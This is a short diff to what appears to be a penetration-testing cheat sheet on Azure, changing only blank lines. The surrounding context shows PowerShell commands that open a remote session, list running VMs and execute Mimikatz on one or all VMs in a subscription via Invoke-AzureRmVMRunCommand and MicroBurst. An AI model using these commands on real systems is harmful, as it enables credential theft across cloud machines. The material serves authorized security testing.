@@ -26,6 +26,7 @@ PS C:\Tools> $creds = New-Object System.Management.Automation.PSCredential('user
 PS C:\Tools> $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
 PS C:\Tools> Enter-PSSession $sess
 
+
 # List available VMs
 PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
 ResourceGroupName    Name       
@@ -35,7 +36,10 @@ TESTRESOURCES        Remote-Test
 # Execute Powershell script on the VM
 PS C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
 
+
 # Excecute Mimikatz on all VMs in the Subscription
 PS C:\> Import-module MicroBurst.psm1
 PS C:\> Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
 ```
+
+
